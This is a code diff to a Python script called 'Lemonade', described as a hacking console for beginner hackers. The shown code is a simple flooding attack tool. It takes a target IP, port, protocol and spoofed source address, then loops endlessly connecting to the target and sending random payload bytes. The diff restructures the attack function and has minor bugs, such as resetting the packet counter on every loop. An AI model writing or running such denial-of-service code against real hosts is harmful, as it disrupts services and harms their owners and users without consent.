@@ -50,30 +50,30 @@ print("""
                                                           
       """)
 
-parser = argparse.ArgumentParser(description = "Lemonade is a simple hacking console with cool features for begginer hackers! made by pastlecry#8645")
+def attack():
+  parser = argparse.ArgumentParser(description = "Lemonade is a simple hacking console with cool features for begginer hackers! made by pastlecry#8645")
 
-parser.add_argument('--TARGET', '--T', help = 'Target IP', required = True)
-parser.add_argument('--PORT', '--P', default = '80', help = 'Port')
-parser.add_argument('--PROTOCOL', '--O', type = str, default = 'UDP', help = 'Transport protocol', choices = ['UDP', 'TCP'])
-parser.add_argument('--FAKEIP', '--F', type = str, default = '182.123.16.28', help = 'Fale IP')
+  parser.add_argument('--TARGET', '--T', help = 'Target IP', required = True)
+  parser.add_argument('--PORT', '--P', default = '80', help = 'Port')
+  parser.add_argument('--PROTOCOL', '--O', type = str, default = 'UDP', help = 'Transport protocol', choices = ['UDP', 'TCP'])
+  parser.add_argument('--FAKEIP', '--F', type = str, default = '182.123.16.28', help = 'Fale IP')
 
-arguments = parser.parse_args()
+  arguments = parser.parse_args()
 
-ip = arguments.TARGET
-port = arguments.PORT
-protocol = arguments.PROTOCOL
-fale_ip = arguments.FAKEIP
+  ip = arguments.TARGET
+  port = arguments.PORT
+  protocol = arguments.PROTOCOL
+  fale_ip = arguments.FAKEIP
 
-bytes = random._urandom(1490)
-pocket = 0
+  bytes = random._urandom(1490)
 
-os.system("clear")
+  os.system("clear")
   #sleep_time = int(input("Time sleep(suggestion: 2 /default=2): "))
   #os.system ("clear")
 
   #if sleep_time is None:
     #sleep_time = 2 
-def attack():
+
   if protocol == "TCP": 
       s = socket(AF_INET, SOCK_STREAM)
 
@@ -83,11 +83,12 @@ def attack():
   else:
     print("undefined protocol!, Ctrl + C to close!")
     
-  while True: 
+  while True:
     s.connect((ip, 80))
     s.send(bytes)
     #s.sendto(("GET /" + ip + "HTTP/1.1\r\n").encode('ascii'), (ip, port))
     #s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
+    pocket = 0
     pocket = pocket + 1
     print(f"pocket{pocket}")
     time.sleep(2)
